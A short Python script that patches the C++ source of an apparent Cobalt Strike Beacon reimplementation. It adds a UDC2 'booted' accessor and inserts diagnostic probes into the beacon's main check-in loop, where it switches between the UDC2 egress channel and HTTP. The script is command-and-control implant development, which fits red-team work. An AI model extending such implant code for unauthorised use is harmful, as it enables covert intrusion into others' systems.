#!/usr/bin/env python3
import io

# 1) accessor for booted state
p2 = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\beacon_udc2.cpp"
s2 = io.open(p2, encoding="utf-8").read()
old2 = "BOOL udc2_enabled(void) {\n\treturn udc2.info.proxy != NULL;\n}"
assert s2.count(old2) == 1
new2 = old2 + "\n\nBOOL udc2_booted(void) {\n\treturn udc2.booted;\n}"
s2 = s2.replace(old2, new2)
io.open(p2, "w", encoding="utf-8", newline="").write(s2)
print("accessor added")

# 2) probes in the main loop
p = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\beacon.cpp"
s = io.open(p, encoding="utf-8").read()
old = """extern void udc2_queue(char * data, int length);"""
assert s.count(old) == 1
s = s.replace(old, """extern void udc2_queue(char * data, int length);
extern BOOL udc2_booted(void);""")

old3 = """		if (beacon_cycles >= 1 && udc2_init()) {
			post_type = POST_UDC2;"""
assert s.count(old3) == 1
new3 = """		if (beacon_cycles >= 1 && udc2_init()) {
			post_error_d(0x62, beacon_cycles); /* probe: engage round (rides UDC2 egress) */
			post_type = POST_UDC2;"""
s = s.replace(old3, new3)

old4 = """		post_type = POST_HTTP;

		/* 创建URL */"""
assert s.count(old4) == 1
new4 = """		if (udc2_booted())
			post_error_d(0x65, beacon_cycles); /* probe: HTTP cycle AFTER udc2 booted */
		post_type = POST_HTTP;

		/* 创建URL */"""
s = s.replace(old4, new4)
io.open(p, "w", encoding="utf-8", newline="").write(s)
print("beacon probes in")
